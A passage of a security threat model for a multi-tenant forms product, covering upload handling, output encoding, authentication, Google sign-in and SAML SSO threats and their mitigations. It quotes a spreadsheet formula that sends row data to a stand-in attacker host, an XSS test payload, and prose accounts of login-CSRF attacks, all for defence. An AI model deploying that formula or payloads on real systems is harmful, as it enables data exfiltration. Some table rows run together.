| MIME-type spoofing (a file's extension/declared type doesn't match its actual content) | Tampering | **Recommendation (new)**: content-based MIME sniffing (not trusting the client-declared `Content-Type` header alone) should be part of the upload-processing pipeline before `mime_type` is persisted — not currently specified anywhere; a concrete requirement for whichever implementation builds the attachment-ingestion service. |
| Oversized upload exhausting storage or bandwidth | Denial of service | **Recommendation (new)**: a per-tenant, per-plan-tier maximum file size and aggregate storage quota, enforced at upload time — `docs/data-dictionary.md` §16's `plans.quotas` (keyed by `UsageMetric`, which already includes `storage_bytes`) is the natural enforcement point; Doc #24 (Pricing & Feature-Gating Matrix) should pin the actual per-tier numbers. |
| Direct object-storage URL guessing/enumeration bypassing the application | Information disclosure | **Mitigated** — S3 keys are namespaced `tenants/{tenant_id}/...` (ADR-0002 §D3) and signed URLs are generated server-side per authenticated request, re-validating the requester's tenant against the attachment's own `tenant_id` before signing (`docs/architecture/technical-architecture.md` §5 row 6) — never a long-lived or guessable public URL. |
| **The tenant brand logo is served to unauthenticated callers** at `GET /branding/logo` (H23a4), the one attachment in the system that is not behind `auth` | Information disclosure / Elevation of privilege | **Accepted, with the scope pinned narrowly.** An email client has no session and fetches images from another IP, often through a proxy (Gmail rewrites every image through googleusercontent.com), days after the message was sent — so the authenticated route answers a branded email with a 302 to login. **Deliberately UNSIGNED** for the same reason: an expiry on an image sitting in an inbox is a broken image on a timer. Four things bound it. (1) **The path carries no attachment id**, so this is not a public read primitive over `attachments` — it resolves `tenants.logo_attachment_id` and nothing else, which also means a logo the tenant removes stops serving immediately. (2) The asset is public by nature (it is the logo every respondent of every branded form sees) and its row is already `is_pii = false`. (3) **SVG cannot reach storage in the first place** — `config/attachments.php` accepts png/jpeg/webp and `AttachmentStorageService::storeBrandingLogo()` content-sniffs rather than trusting the client header, which is what closes the same-origin stored-XSS vector (§5); `nosniff` plus an explicit `Content-Type` are the second and third layers. (4) Unscanned or condemned bytes are never served, and an unentitled tenant answers 404 (`TenantBrandingService::isActive()`, not `hasBrandRamp()`). Every negative answers **404 rather than 409/403**, so an anonymous caller learns nothing the authenticated sibling would tell a staff member. Pinned by `tests/Feature/Branding/BrandingLogoRouteTest.php`. |
| **A feedback screenshot carries an executable payload into the PLATFORM OPERATOR's console** (I7a) | Elevation of privilege / stored XSS | **Mitigated, and the allowlist here is stricter in spirit than the brand logo's for a specific reason.** A brand logo is served same-origin to a tenant's respondents; a feedback screenshot is rendered back into `/admin/feedback` on the **central host**, to the one viewer who is a super-admin over every tenant in the deployment. That makes it the highest-value stored-XSS target in the product, so `config('attachments.feedback_screenshot.accepted_types')` is raster-only (png/jpeg/webp) and is enforced from the **content-sniffed** bytes in `AttachmentStorageService::storeFeedbackScreenshot()`, not the client's declared type; `StoreFeedbackRequest`'s `mimes:` rule exists to give the reporter an inline field error, never as the boundary. Because raster is guaranteed, both screenshot routes serve `inline` unconditionally rather than branching like `AttachmentController::show()`, and `nosniff` is set on both. The image itself is flagged `is_pii = true` (data-dictionary §21 — it is a photograph of whatever was on the reporter's screen), and the unscanned/condemned gate applies exactly as it does to every other attachment. See `docs/adr/0015-feedback-screenshot-capture.md` §D7. |
| Path traversal or filename-based injection via `original_filename` | Tampering | **Mitigated (new, clarifying an existing gap)**: `original_filename` (`docs/data-dictionary.md` §10) is stored purely as **display metadata**, never used to construct the actual storage `path` (which is a server-generated key) or passed unsanitized into any shell/filesystem operation — this should be stated explicitly as an implementation constraint since the existing column documentation doesn't rule it out explicitly. |

## 7. Expression Engine Sandboxing & Template Output Encoding

The architecture plan already commits to "no dynamic `eval()`-style code execution at any point" (`docs/PRD.md` Feature #8's Phase 2 acceptance criteria) — this section defines what "sandboxed" needs to mean concretely, since that phrase alone doesn't specify a threat model.

| Threat | STRIDE | Verdict |
|---|---|---|
| A malicious or careless tenant author writes an expression that executes arbitrary server-side code | Elevation of privilege | **Mitigated** — no `eval()`/dynamic code execution; the expression language (`docs/data-dictionary.md` §6, modeled on XLSForm's `relevant`/`constraint`) is a **closed grammar** of a fixed function allow-list (`if()`, `selected()`, `count()`, `today()`, `now()`, comparison operators) parsed and evaluated by a dedicated interpreter, not a general-purpose scripting language — there is no code path by which an expression string reaches a PHP `eval`, `call_user_func` on an unvalidated string, or any OS-level command execution. |
| A pathological expression (deeply nested, recursive via cross-repeat `count()`, or referencing a very large repeat group) causes excessive CPU/memory consumption | Denial of service | **Recommendation (new)**: the evaluator enforces a maximum expression AST depth/node count at authoring time (rejected at publish, per `docs/form-versioning-schema-migration.md` §4's structural validation gate — a natural place to add this check) and a maximum evaluation-time budget (e.g., abort and treat as `false`/`constraint failed` past a few hundred milliseconds) at runtime, consistent with the performance targets in `docs/non-functional-requirements.md` §1. Neither limit is currently specified anywhere else. |
| An expression referencing a field from a different form version (a dangling/cross-version reference) | Tampering (of data integrity, not security per se) | **Mitigated** — `docs/form-versioning-schema-migration.md` §4 already requires every `related_form_field_id` to belong to the same `form_version_id` being published. |
| Information disclosure via an expression that can reference another respondent's data (cross-submission leakage) | Information disclosure | **Mitigated by design** — the expression grammar's `${field}` references and `count()` resolve only within the *current* submission's own answer document and its own repeat-group instances (`docs/data-dictionary.md` §8's Design Notes on `submission_answers`) — there is no grammar construct that can address a different submission's row at all, so this isn't a guarded-against case so much as a structurally absent capability. **Doc #26 §3.3 extends the same containment to template holes**, which additionally may not cross a repeat-instance boundary within one submission. |

**Answer piping and the template grammar (Doc #26).** The rows above are about what an *author's expression* can reach. Piping inverts the direction: it takes a **respondent's untrusted answer** and carries it into question text, a confirmation screen, an email, a PDF and a chat message. Verdicts marked **Decided (Doc #26 §n)** are ratified design for H6a and are *not* shipped mitigations at the time of writing.

| Threat | STRIDE | Verdict |
|---|---|---|
| A respondent submits markup as an answer; a later question, a confirmation screen or a staff-facing surface pipes it, executing script in another user's browser (stored XSS) | Elevation of privilege / Information disclosure | **PARTLY mitigated (H6a); still Decided (Doc #26 §5) for the rest.** Escaping is per-surface and at render time, in the context being rendered — never at store, and never one canonical escape. **Pinned by H6a:** the Slack `mrkdwn` surface (row below) and the Inertia page-data block, where a `</script>`-bearing answer is proven not to close the block *and* to round-trip intact (`tests/Feature/Security/InertiaDataPageEncodingTest.php`) — note the safety there rests entirely on `json_encode`'s DEFAULT forward-slash escaping, since the installed Inertia directive puts the JSON in the script BODY where no HTML escaping applies; the four `JSON_UNESCAPED_SLASHES` call sites in the webhook channel are the flag that must never migrate onto this path. **Pinned by H6b:** the DOM/HTML row — the guest SPA and the encode page render every piped value through Vue text interpolation or a prop binding, proven by a component test that mounts the real tree and submits `<script>alert(1)</script>` as an answer. **Pinned by H17:** the queued-PDF row — Blade `{{ }}` *is* `htmlspecialchars(ENT_QUOTES, 'UTF-8')`, asserted at four separate sites (answer, form title, section heading and a piped label), plus an attribute-breaking payload for the `ENT_QUOTES` half and a structural scan of every PDF template for a raw-output directive. The engine is configured `isRemoteEnabled = false` / `isPhpEnabled = false` / `isJavascriptEnabled = false`, which is what closes dompdf's published advisory class (SVG parsing, remote fonts, remote file inclusion, image handling — all of which need remote loading). **Still owed:** nothing on this row; the markdown-mail row below is CLOSED by H23a4, and the spreadsheet row remains. **Honest severity note:** CSP offers no mitigation here — `PublicRuntimeSecurityHeaders` deliberately sets no `default-src`/`script-src`, so output encoding is the sole control, not one layer of several (§9 item 9). |
| An untrusted value carries **markdown syntax** rather than HTML into a queued email, producing a live phishing link or a remote tracking image inside a platform-branded message | Spoofing / Information disclosure | ✅ **MITIGATED (H23a4)** — was *"Open, a live defect, assigned to H3/H23"*, and H23a4 is the increment that built the mail template layer it was waiting on, so it closes it rather than inheriting it. `Markdown::withSecuredEncoding()` is enabled in `AppServiceProvider::boot()`, escaping `[`, `<` and `>` in every markdown-mail interpolation. Script execution was already blocked *incidentally* (values pass through `htmlspecialchars` before CommonMark, and `allow_unsafe_links` blocks `javascript:`); what was live is **link and image syntax** in the form and tenant names the notifications interpolate. Pinned by `tests/Feature/Mail/BrandedMailRenderTest.php` and mutation-verified — the phishing anchor returns when the call is commented out. **Residual, deliberately not closed:** `*`, `_` and backticks stay live, so an adversarial name can render italic or as a code span. Both vectors this row names require `[`. |
| An untrusted value carries Slack `mrkdwn` syntax into a connector message, producing a live link or spoofed emphasis in the tenant's channel | Spoofing | **Mitigated (H6a).** `SlackMessageFormatter::mrkdwn()` escapes `&`, `<`, `>` — `&` first, so the entity it introduces is not re-scanned — applied to each untrusted VARIABLE before interpolation rather than to the assembled string, since the class's own copy carries deliberate `*` emphasis. All THREE `mrkdwn` sinks are covered (the section block, the context row and the `text` fallback, which derives from the already-escaped headline); the Block Kit `url` field is deliberately left alone, being a URL context rather than mrkdwn. Pinned by `tests/Unit/Connectors/SlackMessageFormatterTest.php`, which is net-new: the class had no test, and the repo's only message-body assertion was a `str_contains` on trusted copy. |
| An answer beginning `=`, `+`, `-`, `@`, TAB or CR is written to a CSV/XLSX export cell and executes as a formula when a reviewer opens the file (CSV formula injection) | Tampering / Elevation of privilege (on the reviewer's machine) | ✅ **MITIGATED — Increment I8c (2026-08-08).** `App\Support\Export\SpreadsheetCell` prefixes a leading `=`, `+`, `-`, `@`, TAB or CR with `'`, applied at all **seven** `Row::fromValues()` call sites across the **four** openspout writers (`SubmissionExporter`, `AnalyticsExporter`, `AuditExporter`, `XlsformWorkbookWriter`). The writer boundary is where a value stops being data and becomes a spreadsheet cell, which is why the wrapper lives there and not further upstream. ⚠️ **A well-formed number is NEVER prefixed** — `-5`, `+40` and `-1.2e6` all open with a dangerous character and are all ordinary answers, so prefixing them would turn every negative figure in every export into literal text and break the sums a reviewer builds on top of it: a data-integrity regression shipped in the name of security. ⚠️ **NOT applied in `SubmissionRowProjector`**, which looks like the one shared seam that would cover everything: it is shared with `GoogleSheetsConnector`, which is already structurally safe via `valueInputOption=RAW` (see the addendum below), so sanitising there would double-protect a path needing none and put a visible apostrophe in front of every value in a tenant's live spreadsheet. ⚠️ **I2's note pointed at the wrong column of the audit export, and the correction is worth keeping:** `Changes` renders as `key: old → new`, so a tenant-authored VALUE can never sit at position 0 of that cell — a cell beginning `title: ` is inert whatever follows. The genuinely exposed column there is **`Actor`**, a user's own display name, landing unprefixed at the start of a cell; a fix aimed only at `Changes` would have left the real vector open. Pinned by a unit test over the OWASP vectors plus an every-cell assertion in the submission and audit export suites. **H16a addendum, unchanged and still the sharper case:** a Google Sheets connector row is written into a LIVE spreadsheet, so `=IMPORTXML("https://attacker.example?d="&A2,"//x")` would be evaluated by **Google's servers on arrival**, exfiltrating the row with **no human opening anything**. `GoogleSheetsConnector` appends with `valueInputOption=RAW`, under which Google's own documentation states input is "treated literally (formulas beginning with = are treated as text values)" — structural rather than a prefix, since there is no other write path in the adapter. |
| A template hole names a field that does not exist, is of a non-pipeable type, or sits in another repeat instance — producing a broken or ambiguous render | Tampering (of data integrity) | **Mitigated (H6a).** Refused at publish by `TemplateValidationGate`, the third gate in `PublishService` step 1, over all nine template-bearing columns and every locale variant of each. Source eligibility is `App\Enums\PipingEligibility` — a `default`-less `match` over all 31 `FieldType` cases, so a 32nd type is a merge-blocking PHPStan error rather than a silently pipeable one (the H8 device). At render an *unanswered* source yields the empty string and never throws, keeping "unresolvable reference" (publish) and "unanswered value" (render) as separate failure modes. Note the correction Doc #26 §6 amendment A5 records: the no-rejected-template-in-`schema_snapshot` guarantee comes from the publish TRANSACTION, not from the gate's position before the freeze. |

## 8. Authentication, Session & Super-Admin Hardening (elaborating `docs/multi-tenancy-rbac-design.md` §9)

⚠️ **The authentication table below is new in J3c1, and its absence until now was the finding.** This
document had no row for credential stuffing, session fixation, second-factor bypass or recovery-code
replay — an omission, not a judgement that they were out of scope, and it is how a live 2FA lockout went
unrecorded here while being recorded in `docs/feature-backlog.md`. Widened in place rather than added as a
new section: §9 is Residual Risks and §10 is Out of Scope, so a new §9 would renumber both, and six other
documents cite §4–§8 by number. §8 already owned super-admin **MFA**, which is an authentication control,
so the wider title is the accurate one rather than a container of convenience.

| Threat | STRIDE | Verdict |
| --- | --- | --- |
| Credential stuffing / password brute force against `POST /login` | Spoofing | **Mitigated**, by the route middleware rather than by the mechanism Fortify ships for it. `RateLimiter::for('login')` is `Limit::perMinute(5)` keyed on `email\|ip` (`App\Providers\FortifyServiceProvider`), enforced as `throttle:login` on the route. ⚠️ **TWO COUNTERS EXIST AND ONLY ONE IS LIVE — THIS ROW SAID THE WRONG THING ABOUT WHICH.** Because `config/fortify.php:170` sets `limiters.login`, `AuthenticatedSessionController::loginPipeline()` substitutes `null` for `EnsureLoginIsNotThrottled`, so Fortify's own `LoginRateLimiter` is **never consulted** — its `increment()`/`clear()` maintain a bucket nothing reads, and `ThrottleRequests` keys on `md5('login'.$key)` rather than the raw `email\|ip`, so `PrepareAuthenticatedSession::clear()` cannot clear the operative one either. **The enforced rule is therefore 5 attempts per email+IP per minute counted on SUCCESS AS WELL AS FAILURE, never cleared.** Consequences, stated rather than discovered: six successful sign-ins in a minute lock the account out for the rest of that minute; and a 2FA user's `POST /login` short-circuits at `RedirectIfTwoFactorAuthenticatable` and never reaches `PrepareAuthenticatedSession` at all, so nothing even attempts a clear for exactly the population J3c1 made real. Any test or scan performing repeated sign-ins as one identity has ~5 per minute of headroom, not an unlimited budget. Password strength is enforced at every set/reset door by `Password::defaults()`: min 12, four character classes, and `uncompromised()` (HIBP k-anonymity). ⚠️ The HIBP verifier **fails open** to "uncompromised" when the lookup errors, which is the right availability trade and is why `fakeHibp()` exists in `tests/Pest.php`. |
| Session fixation across the two-factor hop | Spoofing | **Mitigated.** Fortify's `TwoFactorAuthenticatedSessionController::store()` calls `$request->session()->regenerate()` after `guard->login()`, so the id that survives the challenge is not the one that carried `login.id`. The pre-challenge session holds only `login.id` and `login.remember` — no identity, no authorization — so possession of it before the second factor grants nothing. |
| Second-factor bypass: a user with confirmed 2FA signs in without presenting it | Elevation of privilege | **Mitigated — and this row is new because the control could not be exercised until J3c1.** Fortify's `RedirectIfTwoFactorAuthenticatable` diverts before the login completes when **both** `two_factor_secret` and `two_factor_confirmed_at` are set (`confirm => true` in `config/fortify.php`); the guard is never logged in first. ⚠️ Until J3c1 the challenge page itself was unreachable (RLS hid the pending user from a static `$model::find()`), which was a **lockout rather than a bypass** — the sign-in failed closed — but it meant nothing in the product had ever completed a second factor. Pinned end-to-end by `tests/Feature/Auth/TwoFactorChallengeTest.php`. ⚠️ Note the deliberate exception recorded in `E2eSeeder`: the E2E super-admin carries `two_factor_confirmed_at` with a NULL secret, a state no real enrolment produces, so CI can open the console without a TOTP. `EnsureSuperAdminMfa` checks only the confirmation stamp, which is what makes that fixture work — and what makes it a fixture-only shape that must never reach production data. |
| Recovery-code replay: a code that has been spent remains valid | Spoofing | ✅ **MITIGATED — Increment J3c1**, and it had been **failing open**. Recovery codes are single-use by construction: `store()` calls `$user->replaceRecoveryCode($code)` to rotate the spent one. | **Invitation-link account takeover: the token holder sets a password on an EXISTING account and is signed in as its owner (M8)** | Spoofing / Elevation of privilege | ✅ **MITIGATED — Increment M8**, and it was **live** rather than theoretical — reproduced before it was believed. `InvitationController` forked on `email_verified_at !== null` and read a NULL as *"this identity does not exist yet"*. It does not mean that: `UpdateUserProfileInformation::updateVerifiedUser()` force-fills `email_verified_at => null` on ANY email change and touches nothing 2FA-related, and Fortify's enrolment routes carry `auth` + `password.confirm` but **not** `verified` — so a fully enrolled member who corrected a typo in their own address was durably enrolled-and-unverified, and `TenantMembershipService::resolveOrCreateUser()` reuses that existing identity rather than minting a placeholder. The joined-membership clause is cross-tenant and needed migration `2026_08_17_000107` (ADR-0002 §D3's M8 amendment). | Account takeover by attaching an unverified alias to a Google account (J3c2) | Spoofing | **Mitigated, and this is the single security bug the increment made available.** Google's `email_verified` claim is the entire basis for believing an address belongs to the account holder — the structural analogue of SAML's signature check. | Account takeover by a reassigned Workspace address (J3c2) | Spoofing | **Mitigated (ADR-0019 §D2, §D4).** A Workspace administrator can hand `alice@company.com` to a new employee after Alice leaves, so an address is not an identity. A mismatched `sub` is refused. `users.email` is never rewritten from Google (§D5), so a silently moved address cannot redirect where password resets go. ⚠️ **Accepted cost, stated:** a person with an UNVERIFIED local account on that address is refused and — per the uniform bounce below — is not told why. |
| Google sign-in used to bypass a user's own second factor (J3c2) | Elevation of privilege | **Mitigated, by a deliberate divergence from ADR-0016 §D32.** A member with confirmed 2FA who signs in with Google is handed to `/two-factor-challenge` rather than logged straight in — Fortify's own shape (`login.id` + redirect), reusing the page J3c1 made reachable. | Replay of a Google `state` or handoff to mint a second session (J3c2) | Spoofing | **Mitigated by construction.** Both legs are single-use, and each transition is a **conditional UPDATE whose affected-row count is the check** — never a read-then-write, the shape this codebase has now ruled out three times. Ordering is additionally pinned at the database by three CHECK constraints, so a row cannot carry a handoff it was never consumed for, nor claim completion before issue. The handoff is stored as a SHA-256 (the plaintext travels in a URL path, so it lands in history, proxy logs and any `Referer` — the `impersonation_tokens` precedent) and lives 60 seconds. ⚠️ The OUTBOUND leg is deliberately NOT stored: replaying it only re-opens a consent screen, and the authorization code behind it is single-use at Google. |
| Linking a Google account by a write that silently affects zero rows (J3c2) | Tampering | **Mitigated, and the failure mode is why the row exists.** `users` carries an own-row UPDATE policy keyed on `app.current_user_id`, which is NULL before `Auth::login()`, so the obvious implementation writes nothing, throws nothing and returns as if it worked — the exact shape that produced PR #147's six endpoints and J3c1's recovery-code fail-open. The link runs on `pgsql_auth`, where `users_auth_select` is `USING (true)`, and **asserts the affected-row count is 1**; a test reads the value back on that connection rather than on the default one. It is also `whereNull('google_id')`, so two concurrent first-time sign-ins settle at the database. |
| Flooding `google_auth_requests` from the unauthenticated mint endpoint (J3c2) | Denial of service | **Mitigated, bounded on the WRITE path.** A per-tenant row cap plus a retention window, trimmed in the same call as the insert, because `routes/console.php` records that nothing runs the scheduler on the production box — a nightly prune would be a bound that exists in the repository and not on the machine. ⚠️ The cap is **"not among the newest N"**, never "older than the Nth": a grinder writes many rows inside one second and a timestamp comparison keeps every tied row. Plus `throttle:google-auth` at 20/min keyed on IP **and** host. ⚠️⚠️ **AND THE TRIM DELETES ONLY ROWS THAT ARE ALREADY SPENT — the first implementation did not, and that was a worse denial of service than the one it prevented.** Ported verbatim from `SsoAuthFailureRecorder::trim()`, whose table holds finished log rows, the rank-only cap evicted rows that were still redeemable: while one member sits on Google's consent screen for up to ten minutes, anyone at all can mint enough rows for that workspace to push theirs past the cap, after which their sign-in fails and the log blames `state_replayed`. Sustained, that is **unauthenticated denial of authentication for an entire tenant**. The liveness predicate is now the outer `AND`. **Stated consequence:** the table is no longer hard-capped at N — it is capped at N *spent* rows plus whatever the rate limiter admits inside one state TTL, which is the honest division of labour, because deleting somebody's in-flight sign-in is not an acceptable way to answer a capacity question. |
| Google login-CSRF: a victim's browser is signed in as the attacker (J3c2) | Spoofing | ✅ **MITIGATED — and it was live until an adversarial review found it after every gate was green.** A signed `state` proves *we* minted the token; it says nothing about *who is holding it*. Nothing bound the browser that started a flow to the one that finished it, so an attacker could obtain an authorization `code` without spending it and send a victim `…/auth/google/callback?code=…&state=…` — the victim's browser completes the exchange and `Auth::login()` runs **on the attacker's account, in the victim's browser**, where everything they then type, upload or configure lands. The tenant arm was the same attack against the handoff URL, accepted in any browser and with an attacker-chosen `return_to` picking the landing page. ⚠️ **The connector flow does not supply this binding either** — its `uid` claim names the member a connection is *attributed* to, and its callback lands on a host that never sees the tenant session, so it could not compare a cookie if it wanted to. ADR-0009 §D3's "the signed state is the CSRF control" is therefore a statement about provenance that reads like one about origin, which is what made this easy to miss (RFC 6749 §10.12 asks for the binding explicitly). The precedent that DOES bind is `SsoStepUpCompletionController`, which compares the request's `user_id` against the person actually signed in on the host it completes on. The fix costs one session key and no token-format change, because on **both** arms the hop that creates the session shares a host with the mint: `google.flow_sid` is written at mint and compared at the central callback and at the tenant completion hop. It compares the flow's own `state_id` rather than merely requiring some value, which is what stops an attacker luring the victim through the mint route first to populate their session. |
| Disclosure through Google sign-in refusals (J3c2) | Information disclosure | **Mitigated.** Every refusal — unknown handoff, expired, replayed, wrong workspace, unverified address, suspended member, closed registration, full seat quota — produces the same `?google=failed`. The value is **closed**: no provider or provisioner string is ever echoed, so it is neither a disclosure oracle nor a reflected-content sink. Reasons go to the log. ⚠️ **And never to `audits`**, which is append-only by RLS and never pruned, so an unauthenticated endpoint writing a row per rejection would be an amplification primitive (ADR-0016 §D19). There is deliberately no `google_auth_failures` twin: unlike SAML, this flow has no tenant-side configuration for an admin to debug. |

**SAML single sign-on (ADR-0016).** Every row above is about a credential this product issues and verifies itself. SSO inverts the authority: a **third party the tenant chose** asserts who somebody is, and the ACS turns that assertion into a session. Verdicts below are shipped mitigations built across **P1a** (the trust anchor), **P1b** (the login round trip) and **P1c** (protocol-aware step-up), not ratified design — each is exercised by `tests/Feature/Sso`. ⚠️ **The absence of this table until now was the finding, in exactly the way §8's own preamble describes for authentication.** Three increments shipped a federated login path while the document that inventories attack surfaces did not name it, so the ACS — the product's highest trust transition — appeared here only as an aside inside the Google rows above — the second-factor row and the login-CSRF row — and the one live defect below sat unrecorded for two increments.

| An unsolicited assertion is replayed at a victim's browser to swap their session (P1b) | Spoofing | **Mitigated.** IdP-initiated SSO is refused permanently: an unsolicited assertion carries no `InResponseTo`, so nothing binds it to a request this SP minted, and accepting one is a login-CSRF primitive by construction. `allow_unsolicited` is a **constant rather than an env var** — §D9 records that an operator toggling it "would silently widen the threat model of every tenant at once". | **A solicited assertion is completed in a browser that never started the flow, signing the victim in as the attacker (P1b)** | Spoofing | ✅ **Mitigated by P1e — and it was reproduced rather than inferred before it was closed.** Nothing bound the browser that *starts* a sign-in to the one that *finishes* it. **Measured: `GET /sso/saml/login` wrote zero session keys**, so there was nothing at the ACS to compare against; `Auth::login()` then ran on whatever browser posted a valid assertion. `request_id` and `InResponseTo` prove *this SP minted this flow* and say nothing about *who is holding it* — the provenance-read-as-origin error this document already records against ADR-0009 §D3 above. **Reproduced end to end:** a flow minted in one session, its assertion submitted from a session that had never visited the mint endpoint, answered `302 /dashboard` with the poster authenticated as the asserted subject. The comparison runs **after** the redeem, so an assertion tried in the wrong browser is burned and cannot be retried in the right one. The ACS now creates nothing on either arm: it marks `verified_at` and `resolved_user_id` in one statement (a CHECK refuses a verified login row carrying no subject) and hands back. Canonicalisation, reference resolution and the wrapping defences are `onelogin/php-saml`'s, on §D15's reasoning that this is the one part of SAML not to implement from the specification; nothing here second-guesses the library, and everything this codebase adds is either *before* it (byte bounds) or *after* it (a check the library cannot be configured to make). | Assertion or request replay (P1b) | Spoofing / Tampering | **Mitigated.** Two independent single-use mechanisms, in that order. `sso_auth_requests.consumed_at` is spent by a **conditional UPDATE whose affected-row count is the check** — never a read-then-write, which leaves two concurrent replays both seeing NULL — and is deliberately absent from `$fillable` so nothing can mass-assign it. A cache ledger keyed on the assertion's own `@ID` then covers an IdP that mints two assertions for one request. **Database-first on purpose:** the cache ledger silently becomes a no-op against a cold or flushed Redis, so the design has to remain sound when it does (§9 item 20). ADR-0009 §D3's stateless HMAC is explicitly **not** reused, on ADR-0009's own terms — it declares itself insufficient once a callback gains a side effect beyond writing the connection it names, and a SAML ACS establishes a session. |
| A stranger invalidates somebody's pending sign-in by posting its request id (P1b) | Denial of service | **Mitigated.** Look up, validate, *then* consume — three steps in that order (§D18). Consuming at look-up time would let any unauthenticated caller kill a live sign-in by posting a body carrying its `InResponseTo`, at a cost of one request; `findLive()` is a pure read for exactly that reason. Both orderings are safe from the *race*, because the consume is the conditional UPDATE above; what is never safe is the read-then-write. |
| Clock drift widens the window in which a captured assertion stays replayable (P1b) | Spoofing | **Mitigated, with a residue this row states rather than implies.** php-saml's `Constants::ALLOWED_CLOCK_DRIFT` is a hard-coded **180 seconds** with no seam to configure it; `config/saml.php` documents **60** and argues it — "the window is the period in which a captured assertion remains replayable, so generosity here is generosity to an attacker who has already achieved interception". Both statements cannot be true unless somebody enforces the tighter one, so `SsoAssertionValidator` runs a second pass over the assertion's `Conditions` **after** the library is satisfied — never before, since reading timestamps nothing has verified a signature over is the difference between a condition and a claim. Pinned by a document 120 seconds stale (inside the library's allowance, outside ours) plus its mirror inside, so the check cannot silently become "refuse everything". ⚠️ **The second pass covers `Conditions` ONLY.** `SubjectConfirmationData`'s `NotBefore`/`NotOnOrAfter` and `SessionNotOnOrAfter` are still judged by the library at 180s, so the effective tolerance is 60s on the element this SP re-checks and up to 180s on the ones it does not. Two docblocks asserted the tighter figure without naming an element; both are corrected in this increment. §9 item 19. |
| A hostile XML document exhausts the process or subverts the parser (P1a/P1b) | Denial of service / Information disclosure | **Mitigated.** Both documents a stranger or a tenant can hand this SP are parsed behind the same hardening: `LIBXML_NONET`, so even a surviving entity cannot dial out; an explicit **DOCTYPE refusal**, which is the line that kills XXE and billion-laughs; and `libxml_use_internal_errors` restored to its previous value, so a malformed document cannot leak parser state into the next request. Byte bounds sit in front of both. `max_response_bytes` (512 KiB) is enforced **before and after** base64-decoding, so a decompression bomb is refused without ever reaching the DOM. `max_metadata_bytes` (256 KiB) is enforced **twice** — in the form request so the tenant gets a field error, and again in `SsoMetadataParser::parse()` so a second caller that forgot cannot reach `loadXML()` — and both count **bytes**, because Laravel's `max:` rule on a string counts characters, which is not the same thing for UTF-8. The measurement that motivated the second bound: 16 MB of well-formed, DOCTYPE-free XML peaks at ~38 MB of DOM on top of the source string, a plausible fatal against a 128 MB limit, and a fatal has no toast and no 422. |

Partial import is refused for a second reason worth keeping: it is precisely how a stale trust anchor survives a key rotation. The parser additionally runs `FILTER_VALIDATE_URL` and requires https outside local on the SSO URL it extracts, and refuses a federation aggregate rather than picking an IdP out of one. |
| The trust anchor is silently rewritten, so the SP trusts a key of the attacker's choosing (P1a) | Tampering | **Mitigated — and the consequence if it ever fails is a total authentication bypass for that tenant.** `idp_certificates` is `encrypted:array` as an **integrity** claim, not a confidentiality one: a signing certificate is public by construction. What was *not* deliberate is that **nothing checked them at sign-in either** — `SsoCertificateInspector` had one consumer, the settings presenter, and php-saml verifies a signature against the stored certificate without ever parsing its validity window, so an expired anchor authenticated indefinitely while `/settings/sso` rendered it as expired. **M2 gives that class a second consumer:** `SsoLoginService::consumeAssertion()` calls `signingState()` ahead of the whole sequence and refuses with `SsoFailureReason::IdpCertificateUnusable` — §D11's roll-up applied on the login path, so a workspace is refused only when NO stored certificate is currently usable and an unfinished rollover is never a total outage. | An identity-provider attribute becomes a path to Owner, or reverses an administrative sanction (P1b) | Elevation of privilege | **Mitigated.** JIT provisioning lands at `sso_connections.default_role_name`, which a **database CHECK** constrains to the seeded role catalog **minus `owner`** — RBAC §5 establishes Owner only by ownership transfer, and a directory attribute must never be a path to it. The four membership outcomes are decided before the shared attach path, not by it (§D20): `Active` is admitted with no write at all; **`Suspended` is REFUSED**, because it is the one status `TenantMembershipService` would happily reactivate and a sign-in that silently reversed an administrative sanction would make the sanction unenforceable in exactly the workspaces most likely to rely on it; `Invited` is activated **at the invited role** rather than the connection's default, since an admin who invited somebody as an Admin expressed an intent about that person by name; and absent/`Declined`/`Removed` are JIT territory, gated on `jit_provisioning_enabled`. The refusal is therefore an exception, and one enclosing transaction is what stops the user created moments earlier being orphaned by it. The JIT account is stamped `email_verified_at` (the assertion is signed by the tenant's own trust anchor and names that address, and there is no verification round trip an SSO user could ever complete) but is given **no ToS or privacy stamp**, because recording an acceptance that never happened is a worse default than leaving the absence visible. It is written as **one INSERT**, never create-then-update: `users` has a permissive INSERT policy but an own-row UPDATE policy keyed on `app.current_user_id`, still null before `Auth::login()`, so a follow-up `save()` would match no policy, update zero rows, throw nothing, and leave the account unverified — the same silent-zero-row shape as PR #147's six endpoints and J3c1's recovery codes. |
| The ACS is used as an oracle to tune a forgery (P1b) | Information disclosure | **Mitigated, with the cost stated rather than hidden.** Unknown request, stale assertion, bad signature, wrong audience, suspended member and exhausted seat quota are one indistinguishable **404** (§D4/§D19): "wrong audience" would tell a forger the signature verified, "already consumed" that the request id was real. The refusal reason goes to the log with a stable machine token. ⚠️ Two details carry the posture that would otherwise leak it: the controller reads `SAMLResponse` with `input()` rather than `validate()`, because a validation failure answers 302-with-errors and would itself be a disclosure; and a failure to *record* the event cannot change the response, since a 500 would be one too. **The accepted cost:** a real employee whose IdP clock has drifted sees a bare 404 and will always see one, because they are the unauthenticated caller this posture is about. §9 item 17. |
| The failure log becomes an amplification primitive, or is used to suppress itself (P1c) | Denial of service | **Mitigated on the write path; the eviction half is Residual.** `sso_auth_failures` exists because §D19's opacity left an admin unable to self-diagnose a clock drift or an expired key — and it is bounded **in the same call as the insert**, never by a scheduled job, because `routes/console.php` records that nothing runs the scheduler on the production box: a nightly prune would be a bound that exists in the repository and not on the machine, for a table a stranger appends to. Refusals are never written to `audits`, which is append-only by RLS and never pruned. Two disclosure rules follow the panel in: `subject_email` is recorded **only** for post-validation refusals, so a stranger cannot write chosen text into a tenant's database, and a claimed `InResponseTo` is stored only in the shape this SP mints — otherwise an over-long value would make the INSERT throw, the recorder swallow it, and the panel go silent for as long as somebody kept sending them, which is a suppression primitive wearing a validation nicety. ⚠️ **What remains: the cap is adversarially reachable.** The ACS is unauthenticated at 60/min, the cap is 200 rows, and the panel shows the newest 20 — so roughly three and a half minutes of grinding displaces every genuine failure and keeps displacing them. Unlike the Google table this trim was later ported to, these are **finished log rows with no in-flight state to destroy**, so the harm is confined to observability rather than being denial of *authentication*. §9 item 21. |
